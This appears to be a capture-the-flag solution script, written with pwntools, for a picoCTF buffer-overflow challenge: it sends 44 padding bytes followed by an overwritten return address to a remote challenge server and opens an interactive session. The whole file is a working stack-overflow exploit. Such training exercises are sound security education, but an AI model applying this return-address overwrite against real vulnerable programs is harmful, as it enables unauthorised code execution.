from pwn import *

context.bits = 32

p = remote("saturn.picoctf.net", 50148)

payload = b"A" * 44

ret2win = p32(0x080491f6)

payload += ret2win

p.sendline(payload)
p.interactive()
